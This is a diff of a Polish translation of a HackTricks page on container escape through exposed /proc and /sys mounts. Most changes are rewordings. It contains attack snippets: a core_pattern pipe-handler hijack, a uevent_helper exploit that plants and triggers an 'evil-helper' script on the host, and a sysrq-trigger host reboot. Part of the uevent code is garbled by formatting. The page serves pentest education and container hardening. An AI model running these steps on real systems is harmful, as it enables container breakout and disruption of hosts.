@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Zacznij od zera i stań się ekspertem od hakowania AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
@@ -14,7 +14,7 @@ Inne sposoby wsparcia HackTricks:
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -22,7 +22,7 @@ Ujawnienie `/proc` i `/sys` bez odpowiedniej izolacji przestrzeni nazw wprowadza
 
 **Możesz znaleźć dalsze szczegóły dotyczące każdej potencjalnej luki w** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
-## Zagrożenia związane z procfs
+## Zagrożenia procfs
 
 ### `/proc/sys`
 
@@ -31,29 +31,29 @@ Ten katalog umożliwia dostęp do modyfikacji zmiennych jądra, zazwyczaj za pom
 #### **`/proc/sys/kernel/core_pattern`**
 
 * Opisany w [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-* Umożliwia zdefiniowanie programu do wykonania podczas generowania pliku rdzenia z pierwszymi 128 bajtami jako argumentami. Może to prowadzić do wykonania kodu, jeśli plik zaczyna się od rury `|`.
+* Pozwala zdefiniować program do wykonania podczas generowania pliku rdzenia z pierwszymi 128 bajtami jako argumentami. Może to prowadzić do wykonania kodu, jeśli plik zaczyna się od rury `|`.
 *   **Przykład testowania i eksploatacji**:
 
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test dostępu do zapisu
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Ustawianie niestandardowego obsługującego
-sleep 5 && ./crash & # Wywołanie obsługującego
+echo "|$overlay/shell.sh" > core_pattern # Ustawianie niestandardowego obsługiwacza
+sleep 5 && ./crash & # Wywołanie obsługiwacza
 ```
 
 #### **`/proc/sys/kernel/modprobe`**
 
-* Szczegóły w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Szczegółowo opisany w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 * Zawiera ścieżkę do ładowacza modułów jądra, wywoływanego do ładowania modułów jądra.
 *   **Przykład sprawdzania dostępu**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # Sprawdź dostęp do modprobe
+ls -l $(cat /proc/sys/kernel/modprobe) # Sprawdzanie dostępu do modprobe
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-* Odwołanie w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Wzmiankowany w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 * Globalna flaga kontrolująca, czy jądro ma panikować czy wywoływać zabójcę OOM, gdy wystąpi warunek OOM.
 
 #### **`/proc/sys/fs`**
@@ -101,7 +101,7 @@ echo b > /proc/sysrq-trigger # Ponowne uruchomienie hosta
 
 * Interfejsuje z urządzeniem pamięci jądra `/dev/mem`.
 * Historycznie podatny na ataki eskalacji uprawnień.
-* Więcej w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Więcej na temat [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
@@ -112,7 +112,7 @@ echo b > /proc/sysrq-trigger # Ponowne uruchomienie hosta
 
 #### **`/proc/kmem`**
 
-* Alternatywny interfejs dla `/dev/kmem`, reprezentujący wirtualną pamięć jądra.
+* Alternatywny interfejs dla `/dev/kmem`, reprezentujący pamięć wirtualną jądra.
 * Umożliwia odczytywanie i zapisywanie, co umożliwia bezpośrednią modyfikację pamięci jądra.
 
 #### **`/proc/mem`**
@@ -123,14 +123,14 @@ echo b > /proc/sysrq-trigger # Ponowne uruchomienie hosta
 #### **`/proc/sched_debug`**
 
 * Zwraca informacje o harmonogramowaniu procesów, omijając zabezpieczenia przestrzeni nazw PID.
-* Ujawnia nazwy procesów, identyfikatory PID i identyfikatory cgroup.
+* Ujawnia nazwy procesów, identyfikatory PID i grupy cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
 * Udostępnia informacje o punktach montowania w przestrzeni nazw montowania procesu.
 * Ujawnia lokalizację `rootfs` kontenera lub obrazu. 
 
-### Zagrożenia związane z `/sys`
+### Zagrożenia sysfs
 
 #### **`/sys/kernel/uevent_helper`**
 
@@ -138,23 +138,23 @@ echo b > /proc/sysrq-trigger # Ponowne uruchomienie hosta
 * Zapisywanie do `/sys/kernel/uevent_helper` może uruchamiać arbitralne skrypty po wyzwaleniu `uevent`.
 *   **Przykład eksploatacji**: %%%bash
 
-## Tworzy ładunek
+### Tworzy ładunek
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-## Znajduje ścieżkę hosta z montażu OverlayFS dla kontenera
+### Znajduje ścieżkę hosta z montowania OverlayFS dla kontenera
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-## Ustawia uevent\_helper na złośliwego pomocnika
+### Ustawia uevent\_helper na złośliwego pomocnika
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-## Wywołuje uevent
+### Wywołuje uevent
 
 echo change > /sys/class/mem/null/uevent
 
-## Odczytuje wynik
+### Odczytuje wynik
 
 cat /output %%%
 #### **`/sys/class/thermal`**
@@ -163,7 +163,7 @@ cat /output %%%
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-* Ujawnia adresy jądra, potencjalnie kompromitując KASLR.
+* Wycieka adresy jądra, potencjalnie kompromitując KASLR.
 
 #### **`/sys/kernel/security`**
 
@@ -172,8 +172,8 @@ cat /output %%%
 
 #### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
 
-* Ujawnia interfejsy do interakcji z zmiennymi EFI w NVRAM.
-* Niewłaściwa konfiguracja lub eksploatacja może prowadzić do zablokowania laptopów lub niemożności uruchomienia hosta.
+* Ujawnia interfejsy do interakcji z zmiennymi EFI w pamięci NVRAM.
+* Niewłaściwa konfiguracja lub eksploatacja może prowadzić do zablokowania laptopów lub niemożliwości uruchomienia hosta.
 
 #### **`/sys/kernel/debug`**
 
@@ -186,7 +186,7 @@ cat /output %%%
 * [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -199,7 +199,7 @@ Inne sposoby wsparcia HackTricks:
 * Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
